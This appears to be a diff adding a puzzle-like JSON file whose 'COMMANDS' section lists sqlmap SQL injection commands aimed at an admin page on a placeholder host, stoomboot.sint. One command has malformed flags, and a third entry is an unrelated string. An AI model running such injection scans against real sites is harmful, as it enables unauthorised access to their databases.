@@ -1,0 +1,11 @@
+{
+  "DECRYPTED": true,
+  "null": null,
+  "number": 7348384,
+  "COMMANDS": {
+    "#01": "sqlmap -u http://stoomboot.sint/groteboek/admin/index.php?CatID=666 --dbs",
+    "#02": "sqlmap -u http://stoomboot.sint/groteboek/admin/index.php?CatID=666 --user-agent --level=3 -GET hoofd_piet",
+    "#03": "VLSI_Circuit_Circuit_Breaker_2.0"
+  },
+  "string": "Goodluck."
+}
